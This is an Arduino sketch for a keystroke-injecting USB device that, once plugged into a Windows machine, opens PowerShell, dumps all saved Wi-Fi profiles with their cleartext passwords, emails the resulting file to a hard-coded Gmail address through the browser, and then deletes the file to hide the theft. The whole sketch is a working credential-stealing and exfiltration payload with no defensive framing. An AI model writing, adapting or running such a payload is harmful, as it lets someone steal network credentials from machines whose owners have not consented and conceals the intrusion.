#include <Keyboard.h>
void setup() {


  Keyboard.begin();
  delay(3000); // Wait for system to be ready

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("$profiles = (netsh wlan show profiles | Where-Object { $_ -match \":\\s*(.+)$\" } | ForEach-Object { ($_ -split \":\\s*\")[1].Trim() })");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("$results = @()");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("foreach ($profile in $profiles) {");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("$output = netsh wlan show profile name=\"$profile\" key=clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("$password = $output | Select-String \"Key Content\\s*:\\s*(.+)$\" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("$results += if ($password) {");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("    \"Profile: $profile, Password: $password\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("  } else {");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("        \"Profile: $profile, Status: Open network or no password saved.\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("    }");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("}");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("$desktopPath = \"C:\\Users\\seraj\\OneDrive\\Desktop\\WiFiPasswords.txt\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("$results | Out-File -FilePath $desktopPath -Encoding UTF8");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("Write-Host \"Results saved to $desktopPath\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);


  delay(1000); // Wait for system to be ready     
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("https://mail.google.com");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);
  for (int i = 0; i < 13; i++) { 
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(500);
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.print("sah.seraji@gmail.com");
  Keyboard.press(KEY_TAB); // Move to subject field
  Keyboard.releaseAll();
  delay(500);

  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("WiFiPasswords");


  for (int i = 0; i < 4; i++) { // Adjust based on the number of tabs needed
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
    delay(500);
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(100);
  for (int i = 0; i < 11; i++) { // Adjust based on the number of tabs needed
    Keyboard.press(KEY_TAB);
    Keyboard.releaseAll();
  }
  delay(500);
  Keyboard.print("WiFiPasswords.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(3000);

  Keyboard.print("del \"C:\\Users\\seraj\\OneDrive\\Desktop\\WiFiPasswords.txt\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(500);
}
  
void loop() {
  

}
